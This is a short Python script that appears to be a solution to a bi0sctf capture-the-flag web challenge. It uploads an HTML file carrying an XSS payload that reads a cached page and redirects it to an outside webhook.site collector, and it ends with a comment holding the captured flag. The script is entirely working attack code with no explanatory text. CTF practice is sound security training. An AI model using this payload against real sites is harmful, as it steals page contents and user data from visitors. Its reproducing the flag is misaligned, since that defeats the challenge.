import httpx, time

url = "ch16496143432.ch.eng.run"

client = httpx.Client(base_url=url) 
res = client.post("/share", json={"id": "x"}, timeout=1) 
print(res.status_code)

time.sleep(2) 

payload = """
<script> 
    fetch('/', {
        cache: "force-cache", 
    }).then(r=>r.text()).then(r=>{
        location = 'https://webhook.site/49bf9d14-dc50-4582-a5f7-d35ad68edc26/?f='+encodeURIComponent(r);
    })
</script> 
""".strip()
client.post("/upload", 
            files={"image": ("index.html", payload)},
            cookies={"sid": "."})
client.get("/?f=x")
# https://ch16496143432.ch.eng.run/5b47c243-b5ee-45ba-b7bb-b569b24bbff0/flag.txt
# bi0sctf{Tqle5HDnV8FHmQHcumjKhw==}